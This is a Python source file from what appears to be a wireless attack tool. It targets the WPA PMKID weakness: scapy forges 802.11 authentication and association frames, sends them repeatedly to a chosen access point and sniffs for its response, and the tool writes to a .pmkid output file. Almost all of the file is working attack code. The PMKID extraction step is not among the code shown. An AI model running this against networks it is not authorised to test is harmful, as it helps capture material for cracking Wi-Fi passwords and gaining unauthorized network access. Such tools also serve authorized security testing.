import os
import re
import sys
import time
import curses
import random
import binascii
import threading
import subprocess
from pull import PULL
from scapy.sendrecv import sniff
from scapy.sendrecv import sendp
from scapy.utils    import PcapWriter
from scapy.packet   import Raw
from scapy.arch     import get_if_raw_hwaddr as HWADDR
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11Deauth
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import Dot11Beacon
from scapy.layers.dot11 import Dot11Elt
from scapy.layers.dot11 import Dot11EltRSN
from scapy.layers.dot11 import Dot11FCS
from scapy.layers.dot11 import Dot11EltMicrosoftWPA
from scapy.layers.dot11 import Dot11EltCountry
from scapy.layers.dot11 import Dot11Auth
from scapy.layers.dot11 import Dot11AssoReq
from scapy.layers.eap   import EAPOL

pull = PULL()

class PMKID:

	__AUTHRUNNER = True
	__AUTHSTATUS = True

	def __init__(self, iface, bssid, essid, channel, power, device, encryption, cipher, auth, beacon, stations, outfname, pauth, passo, delay):
		self.interface  = iface
		self.bssid      = bssid
		self.essid      = essid
		self.channel    = channel
		self.power      = power
		self.device     = device
		self.encryption = encryption
		self.cipher     = cipher
		self.auth       = auth
		self.stations   = stations
		self.beacon     = beacon
		self.output     = self.output(outfname)
		self.pauth      = pauth
		self.passo      = passo
		self.delay      = delay

	def output(self, fl):
		if fl:
			if fl.endswith(".pmkid"):
				return fl
			elif fl.endswith("."):
				return (fl + "pmkid")
			else:
				return (fl + ".pmkid")
		else:
			return False

	def extract_sn_rc(self, pkt):
		try:
			sn = pkt.getlayer(Dot11FCS).addr2
			rc = pkt.getlayer(Dot11FCS).addr1
		except:
			sn = pkt.getlayer(Dot11).addr2
			rc = pkt.getlayer(Dot11).addr1

		return (sn, rc)

	def channeler(self):
		ch = str(self.channel)
		subprocess.call(['iwconfig', self.interface, 'channel', ch])

	def get_my_address(self):
		retval = HWADDR(self.interface)
		family = retval[0]
		hwaddr = retval[1]
		hwaddr = binascii.hexlify(hwaddr).decode()
		hwaddr = ':'.join(hwaddr[i:i+2] for i in range(0,12,2))
		return hwaddr

	def forge_auth_frame(self, ap, cl):
		pkt = Dot11(
				addr1=ap,
				addr2=cl,
				addr3=ap
			) / Dot11Auth(
				seqnum=1
			)

		return pkt

	def forge_asso_frame(self, ap, cl):
		def enum(pkt):
			elts = pkt.getlayer(Dot11Elt)
			return elts

		def form(efields, layer):
			retval = layer / efields
				
			return retval

		capibility = self.beacon.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
		pkt        = Dot11(
							addr1=ap,
							addr2=cl,
							addr3=ap
						) / Dot11AssoReq(
							cap=capibility,
							listen_interval=3
						)

		efields    = enum(self.beacon)
		pkt        = form(efields, pkt)
		return pkt

	def auth_sender(self, pkt):
		while self.__AUTHRUNNER:
			sendp(
				pkt,
				count=self.pauth,
				delay=self.delay
			)

			pull.print(
				"*",
				"Authentication Req. Count [{packets}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
					packets=pull.RED+str(self.pauth)+pull.END,
					apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
					ap=self.bssid.upper(),
					stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
					sta=self.myaddress.upper(),
					essid=pull.YELLOW+self.essid+pull.END
				),
				pull.YELLOW
			)

		self.__AUTHSTATUS = False

	def auth_receiver(self, pkt):
		if pkt.haslayer(Dot11Auth):
			retval = self.extract_sn_rc(pkt)
			sn     = retval[0]
			rc     = retval[1]

			if sn == self.bssid and rc == self.myaddress:
				pull.print(
					"$",
					"Authentication Res. [{status}] ({apvendor}) {ap} <--> ({stavendor}) {sta} ({essid})".format(
						status=pull.GREEN+"Confirmed!"+pull.END,
						apvendor=pull.DARKCYAN+pull.get_mac(self.bssid)+pull.END,
						ap=self.bssid.upper(),
						stavendor=pull.DARKCYAN+pull.get_mac(self.myaddress)+pull.END,
						sta=self.myaddress.upper(),
						essid=pull.YELLOW+self.essid+pull.END
					),
					pull.GREEN
				)
				raise KeyboardInterrupt()

	def engage(self):
		self.myaddress  = self.get_my_address()
		auth_frame = self.forge_auth_frame( self.bssid, self.myaddress )
		asso_frame = self.forge_asso_frame( self.bssid, self.myaddress )

		t = threading.Thread(target=self.auth_sender, args=(auth_frame,))
		t.daemon = True
		t.start()

		sniff(iface=self.interface, prn=self.auth_receiver)

		self.__AUTHRUNNER = False
		while self.__AUTHSTATUS:
			pass

